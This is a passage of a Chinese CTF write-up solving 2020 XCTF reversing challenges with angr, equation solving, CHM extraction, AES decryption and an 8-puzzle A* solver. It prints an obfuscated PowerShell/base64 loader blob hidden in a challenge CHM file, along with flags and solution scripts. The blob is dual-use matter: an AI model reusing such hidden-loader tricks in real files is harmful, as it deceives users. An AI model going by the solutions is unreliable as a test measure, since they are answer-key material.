class="number">30</span>];</span><br><span class="line"><span class="comment">// [line 442, line 711]</span></span><br><span class="line">mem[<span class="number">37</span>]=<span class="number">53</span>;</span><br><span class="line">mem[<span class="number">38</span>]=<span class="number">-28</span>;</span><br><span class="line">mem[<span class="number">39</span>]=<span class="number">5</span>;</span><br><span class="line">mem[<span class="number">40</span>]=<span class="number">-98</span>;</span><br><span class="line">mem[<span class="number">41</span>]=<span class="number">73</span>;</span><br><span class="line">mem[<span class="number">42</span>]=<span class="number">123</span>;</span><br><span class="line"><span class="comment">// [line 712, line 723]</span></span><br><span class="line">mem[<span class="number">37</span>]-=mem[<span class="number">31</span>];</span><br><span class="line">mem[<span class="number">38</span>]-=mem[<span class="number">32</span>];</span><br><span class="line">mem[<span class="number">39</span>]-=mem[<span class="number">33</span>];</span><br><span class="line">mem[<span class="number">40</span>]-=mem[<span class="number">34</span>];</span><br><span class="line">mem[<span class="number">41</span>]-=mem[<span class="number">35</span>];</span><br><span class="line">mem[<span class="number">42</span>]-=mem[<span class="number">36</span>];</span><br><span class="line"><span class="comment">// [line 724, line 777]</span></span><br><span class="line">mem[<span class="number">43</span>]=<span class="number">48</span>;</span><br><span class="line"><span class="comment">// [line 778, line 779]</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">37</span>;i&lt;=<span class="number">42</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(mem[i]) mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">    mem[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [line 780, line 803]</span></span><br></pre></td></tr></table></figure><p>后半段输入后，处理的简化程序为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mem[<span class="number">50</span>]=<span class="number">101</span>;</span><br><span class="line">mem[<span class="number">51</span>]=<span class="number">95</span>;</span><br><span class="line">mem[<span class="number">52</span>]=<span class="number">67</span>;</span><br><span class="line">mem[<span class="number">53</span>]=<span class="number">48</span>;</span><br><span class="line">mem[<span class="number">54</span>]=<span class="number">100</span>;</span><br><span class="line">mem[<span class="number">55</span>]=<span class="number">51</span>;</span><br><span class="line"><span class="comment">// [line 810, line 821]</span></span><br><span class="line">mem[<span class="number">50</span>]-=mem[<span class="number">44</span>];</span><br><span class="line">mem[<span class="number">51</span>]-=mem[<span class="number">45</span>];</span><br><span class="line">mem[<span class="number">52</span>]-=mem[<span class="number">46</span>];</span><br><span class="line">mem[<span class="number">53</span>]-=mem[<span class="number">47</span>];</span><br><span class="line">mem[<span class="number">54</span>]-=mem[<span class="number">48</span>];</span><br><span class="line">mem[<span class="number">55</span>]-=mem[<span class="number">49</span>];</span><br><span class="line"><span class="comment">// [line 822, line 875]</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">50</span>;i&lt;=<span class="number">55</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(mem[i]) mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">    mem[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [line 876, line 899]</span></span><br></pre></td></tr></table></figure><p>至此分析完成。</p><p>而mem[43]一开始赋值就是48，也就是说两个for循环都不能进到if里。令s[12]为所求字符串，则可以得出方程组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">1</span>]+s[<span class="number">2</span>]*<span class="number">2</span>+s[<span class="number">3</span>]*<span class="number">3</span>+s[<span class="number">4</span>]*<span class="number">4</span>+s[<span class="number">5</span>]*<span class="number">5</span>==<span class="number">53</span>;<span class="comment">//mem[2]+mem[9]+mem[16]+mem[23]+mem[30]==53;</span></span><br><span class="line">s[<span class="number">0</span>]*<span class="number">5</span>+s[<span class="number">1</span>]*<span class="number">4</span>+s[<span class="number">2</span>]*<span class="number">3</span>+s[<span class="number">3</span>]*<span class="number">2</span>+s[<span class="number">4</span>]*<span class="number">1</span>==<span class="number">-28</span>;<span class="comment">//mem[25]+mem[20]+mem[15]+mem[10]+mem[5]==-28;</span></span><br><span class="line">s[<span class="number">0</span>]*<span class="number">3</span>+s[<span class="number">1</span>]*<span class="number">2</span>+s[<span class="number">2</span>]*<span class="number">1</span>+s[<span class="number">3</span>]*<span class="number">4</span>+s[<span class="number">5</span>]*<span class="number">5</span>==<span class="number">5</span>;<span class="comment">//mem[13]+mem[8]+mem[3]+mem[22]+mem[30]==5;</span></span><br><span class="line">s[<span class="number">0</span>]*<span class="number">2</span>+s[<span class="number">1</span>]*<span class="number">1</span>+s[<span class="number">2</span>]*<span class="number">4</span>+s[<span class="number">3</span>]*<span class="number">5</span>+s[<span class="number">4</span>]*<span class="number">3</span>==<span class="number">-98</span>;<span class="comment">//mem[7]+mem[2]+mem[21]+mem[28]+mem[17]==-98;</span></span><br><span class="line">s[<span class="number">1</span>]*<span class="number">2</span>+s[<span class="number">2</span>]*<span class="number">3</span>+s[<span class="number">3</span>]*<span class="number">4</span>+s[<span class="number">4</span>]*<span class="number">5</span>+s[<span class="number">5</span>]*<span class="number">1</span>==<span class="number">73</span>;<span class="comment">//mem[8]+mem[15]+mem[22]+mem[29]+mem[6]==73;</span></span><br><span class="line">s[<span class="number">0</span>]*<span class="number">2</span>+s[<span class="number">1</span>]*<span class="number">4</span>+s[<span class="number">2</span>]*<span class="number">1</span>+s[<span class="number">4</span>]*<span class="number">3</span>+s[<span class="number">5</span>]*<span class="number">5</span>==<span class="number">123</span>;<span class="comment">//mem[7]+mem[20]+mem[3]+mem[17]+mem[30]==123;</span></span><br><span class="line">s[<span class="number">6</span>]==<span class="number">101</span>;</span><br><span class="line">s[<span class="number">7</span>]==<span class="number">95</span>;</span><br><span class="line">s[<span class="number">8</span>]==<span class="number">67</span>;</span><br><span class="line">s[<span class="number">9</span>]==<span class="number">48</span>;</span><br><span class="line">s[<span class="number">10</span>]==<span class="number">100</span>;</span><br><span class="line">s[<span class="number">11</span>]==<span class="number">51</span>;</span><br></pre></td></tr></table></figure><p>因为涉及到char型数据解方程的问题，s[0]-s[5]不好直接出，爆破又太慢了，所以决定构造一个程序用angr破：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// useAngr.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">6</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%6s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">char</span> x1=s[<span class="number">1</span>]+s[<span class="number">2</span>]*<span class="number">2</span>+s[<span class="number">3</span>]*<span class="number">3</span>+s[<span class="number">4</span>]*<span class="number">4</span>+s[<span class="number">5</span>]*<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> x2=s[<span class="number">0</span>]*<span class="number">5</span>+s[<span class="number">1</span>]*<span class="number">4</span>+s[<span class="number">2</span>]*<span class="number">3</span>+s[<span class="number">3</span>]*<span class="number">2</span>+s[<span class="number">4</span>]*<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> x3=s[<span class="number">0</span>]*<span class="number">3</span>+s[<span class="number">1</span>]*<span class="number">2</span>+s[<span class="number">2</span>]*<span class="number">1</span>+s[<span class="number">3</span>]*<span class="number">4</span>+s[<span class="number">5</span>]*<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> x4=s[<span class="number">0</span>]*<span class="number">2</span>+s[<span class="number">1</span>]*<span class="number">1</span>+s[<span class="number">2</span>]*<span class="number">4</span>+s[<span class="number">3</span>]*<span class="number">5</span>+s[<span class="number">4</span>]*<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">char</span> x5=s[<span class="number">1</span>]*<span class="number">2</span>+s[<span class="number">2</span>]*<span class="number">3</span>+s[<span class="number">3</span>]*<span class="number">4</span>+s[<span class="number">4</span>]*<span class="number">5</span>+s[<span class="number">5</span>]*<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> x6=s[<span class="number">0</span>]*<span class="number">2</span>+s[<span class="number">1</span>]*<span class="number">4</span>+s[<span class="number">2</span>]*<span class="number">1</span>+s[<span class="number">4</span>]*<span class="number">3</span>+s[<span class="number">5</span>]*<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span>(x1==<span class="number">53</span>&amp;&amp;x2==<span class="number">-28</span>&amp;&amp;x3==<span class="number">5</span>&amp;&amp;x4==<span class="number">-98</span>&amp;&amp;x5==<span class="number">73</span>&amp;&amp;x6==<span class="number">123</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulations!!!!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>useAngr_exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">t=time.clock()</span><br><span class="line">path_to_binary=<span class="string">&#x27;./useAngr&#x27;</span></span><br><span class="line">project=angr.Project(path_to_binary,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">initial_state=project.factory.entry_state()</span><br><span class="line">simulation=project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">find_address=<span class="number">0x4008CC</span></span><br><span class="line">simulation.one_active.options.add(angr.options.LAZY_SOLVES)</span><br><span class="line">simulation.explore(find=find_address)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;time:&#x27;</span>,<span class="built_in">round</span>(time.clock()-t,<span class="number">2</span>),<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state=simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution. _0x0_&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解得：</p><p><img src="/p/wpFor-2020XCTF/image-20210123225114504.png"></p><p>有不可见字符，不过可以通过-0x80得到可见字符（估计是前面判定+和-的地方有点出入，问题不大）。</p><p>最后整理得到字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key1=<span class="string">b&#x27;\xd23v\xe5\xd2\xd3&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> key1:</span><br><span class="line">    <span class="keyword">if</span> c&gt;<span class="number">0x7f</span>:</span><br><span class="line">        print(<span class="built_in">chr</span>(c<span class="number">-0x80</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="built_in">chr</span>(c),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">key2=[<span class="number">101</span>,<span class="number">95</span>,<span class="number">67</span>,<span class="number">48</span>,<span class="number">100</span>,<span class="number">51</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> key2:</span><br><span class="line">    print(<span class="built_in">chr</span>(x),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2020XCTF/image-20210123225812567.png"></p><p>由于要连远程拿flag，所以复现的时候只有本地打通没有flag，打通撒花~</p><p><img src="/p/wpFor-2020XCTF/image-20210123225914910.png"></p><p><strong>R3veRSe_C0d3</strong></p><hr><h1 id="12-27-HarmonyOS和HMS专场"><a href="#12-27-HarmonyOS和HMS专场" class="headerlink" title="[12.27] HarmonyOS和HMS专场"></a>[12.27] HarmonyOS和HMS专场</h1><blockquote><p>难得有一场ak逆向了！（虽然有大佬带着</p><p>有三道题都是卡着四血交，实惨TAT</p></blockquote><h2 id="re123"><a href="#re123" class="headerlink" title="re123"></a>re123</h2><p>用file命令可以看到是MS Windows HtmlHelp Data文件（即.chm），查看文件头也可以知道。</p><p><img src="/p/wpFor-2020XCTF/image-20201229191137544.png"></p><p><img src="/p/wpFor-2020XCTF/image-20201229191253926.png"></p><p>所以添加后缀名.chm。</p><p>关于chm文件有一个常用的反编译器ChmDecompiler，可以释放CHM里面的全部源文件（包括网页、文本、图片、CHM、ZIP、EXE等全部源文件），并且完美地恢复源文件的全部目录结构 <del>（摘抄的简介</del>。</p><p>所以用ChmDecompiler打开re.chm，解压缩，可以看到目录下出现一个包含四个文件的文件夹（其实源文件只有三个，.hhp是ChmDecompiler自动生成的）。</p><p><img src="/p/wpFor-2020XCTF/image-20201229191554582.png"></p><p>一个一个翻可以看到doc.htm里有一段奇怪的Item1。</p><p><img src="/p/wpFor-2020XCTF/image-20201229192220277.png"></p><p>大概可以看到是powershell的语法？（感觉像win后门，这么多no的参数</p><p>查了一下其实就是把后面那大段进行base64解码而已，用wsl解一下base64有</p><p><img src="/p/wpFor-2020XCTF/nTe52VJs0Ho9ZDxh7sTOyw.jpg" alt="img"></p><p>然后得到了一段.NET代码（白字）。</p><p>通过查微软文档可以知道，这里是把base64解码以后的字符进行Deflate解压的过程，所以用脚本把中间那段base64解码，并整理输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deflate</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> zlib.decompress(data, -zlib.MAX_WBITS)</span><br><span class="line">    <span class="keyword">except</span> zlib.error:</span><br><span class="line">        <span class="keyword">return</span> zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">code=<span class="string">&#x27;TY5BC4IwGIbvgv9hjB2McJhEhNChJMGTkN2qg7qvFHQT/bL575vpoV2/53n2skJJBInkQG5xwqOqhkcQXCATx7q+gkaHsvYj7kIVvCgburItVgm9MTxbVB5LATp5OlQvb6IMV0LdQvdPpu+8x66SL2eOrMl+Ck7naUA69ggND5UcoEOzI+pUc8p62G3TRZubv34K6IbLespADoGR27vv+R7HpqXzt8Q9y0IJI5N8RLCtLw==&#x27;</span></span><br><span class="line">de_code=deflate(base64.b64decode(code)).decode()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> de_code.split(<span class="string">&#x27;\r\n&#x27;</span>):</span><br><span class="line">    print(x)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2020XCTF/image-20201229193302890.png"></p><p>很明显的逻辑了，把doc.chm（应该是原来的re.chm）中”xxxxxxxx”后面的部分提取出来，还是用base64解码得到文件。</p><p><img src="/p/wpFor-2020XCTF/f3TgvbZfbMKJow7IhgNlKA.jpg" alt="img"></p><p>把这后面的内容手动复制出来到cont.txt里，进行base64解码，最后存在theFile中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -d cont.txt &gt; theFile</span><br></pre></td></tr></table></figure><p>查看theFile可以猜测是exe（毕竟最开始给的就是有powershell指令的base64），把文件头补上，并改后缀名（即theFile.exe）。</p><p><img src="/p/wpFor-2020XCTF/jAAyrn9wsYFQ6IlOFM9BfA.jpg" alt="img"></p><p>用ida打开，通过FindCrypt插件可以看到AES，跟过去能看到AES加密时的S盒（其实这里前两个都是S盒，第三个是逆S盒），猜测用到了AES加密。</p><p><img src="/p/wpFor-2020XCTF/image-20201229195213434.png"></p><p><img src="/p/wpFor-2020XCTF/image-20201229195456197.png"></p><p>往上回溯找到主函数</p><p><img src="/p/wpFor-2020XCTF/image-20201229195646671.png"></p><p>显然，这里是AES加密过程，sub_180001100()是密钥拓展过程，sub_1800015B0()是AES加密。</p><blockquote><p>关于逆向中各种常见密码的记录，指路：<a href="https://yfli.top/2020/02/18/encrypt_document/#more">对称加密算法&amp;&amp;Hash算法 文档 | feng’s blog</a></p></blockquote><p>看了一下感觉是原装无魔改的AES，密文密钥都给了，那就直接写脚本解密。</p><p>注意这里是以整数形式给出的，别忘了小端序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arr=[<span class="number">0x16157E2B</span>,<span class="number">0xA6D2AE28</span>,<span class="number">0x8815F7AB</span>,<span class="number">0x3C4FCF09</span>]</span><br><span class="line">key=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    key=<span class="built_in">hex</span>(arr[i])[<span class="number">2</span>:]+key</span><br><span class="line">key=unhexlify(key)[::<span class="number">-1</span>] <span class="comment">#注意小端序的问题</span></span><br><span class="line">tmp=<span class="number">0x46C42084AA2A1B56E799D643453FF4B5</span></span><br><span class="line">cipher=unhexlify(<span class="built_in">hex</span>(tmp)[<span class="number">2</span>:])[::<span class="number">-1</span>]</span><br><span class="line">enc=AES.new(key,AES.MODE_ECB)</span><br><span class="line">print(enc.decrypt(cipher))</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2020XCTF/image-20201229202801230.png"></p><p><strong>flag{youcangues}</strong></p><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>mips架构。</p><p>加载进ida以后，通过字符串回溯找到主函数。</p><p><img src="/p/wpFor-2020XCTF/image-20201229203258179.png"></p><p><img src="/p/wpFor-2020XCTF/image-20201229203319240.png"></p><p>可以看到很明显的sub_401134()这个check，先往这里面看。</p><p><img src="/p/wpFor-2020XCTF/image-20201229203405086.png"></p><p>看到是一个疑似maze的逻辑（</p><p>不过sub_400FA8()点进去以后可以看到是swap的功能</p><p><img src="/p/wpFor-2020XCTF/image-20201229203651570.png"></p><p>所以应该不是maze，是一个以交换为主的逻辑。</p><p>至于dword_4A0010，可以看到是一个九个数的数组。</p><p><img src="/p/wpFor-2020XCTF/image-20201229203733240.png"></p><p>v4和v5的出处在switch逻辑上面一点</p><p><img src="/p/wpFor-2020XCTF/image-20201229204029832.png"></p><p>可以看到最后(v4,v5)其实表示了数组里0的位置，且数组实际可以看成是3*3。</p><p>即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4 0 3</span><br><span class="line">7 2 6</span><br><span class="line">8 1 5</span><br></pre></td></tr></table></figure><p>最后sub_400FFC()的检查逻辑：</p><p><img src="/p/wpFor-2020XCTF/image-20201229204442580.png"></p><p>实际上就是要让这个3*3等于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2 3</span><br><span class="line">4 5 6</span><br><span class="line">7 8 0</span><br></pre></td></tr></table></figure><p>把0看成空位的话，很容易就想到3*3的华容道了。</p><p>（或者玩算法的小伙伴可能对八数码问题这个名字更熟悉？</p><p><del>有本事下次出数织啊！20*20我都给你火速解出来（来自数织爱好者的吐槽）</del></p><p>这里实际上是求最短能得到的路径（15步），懒得想了，直接去网上抓了个现成代码下来改了改。</p><blockquote><p>八数码问题的代码见：<a href="https://blog.csdn.net/lishang6257/article/details/79732420">八数码问题-A*(AStar)算法实现_Broken Geeker-CSDN博客</a></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxState 10000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 3</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isEqual</span><span class="params">(<span class="keyword">int</span> a[N][N][maxState],<span class="keyword">int</span> b[N][N],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; N;j ++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i][j][n] != b[i][j]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isEqual</span><span class="params">(<span class="keyword">int</span> a[N][N],<span class="keyword">int</span> b[N][N])</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; N;j ++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i][j] != b[i][j]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evalute</span><span class="params">(<span class="keyword">int</span> state[N][N],<span class="keyword">int</span> target[N][N])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; N;j ++)</span><br><span class="line">            <span class="keyword">if</span>(state[i][j] != target[i][j]) num ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findBrack</span><span class="params">(<span class="keyword">int</span> a[N][N],<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; N;j ++)&#123;</span><br><span class="line">            <span 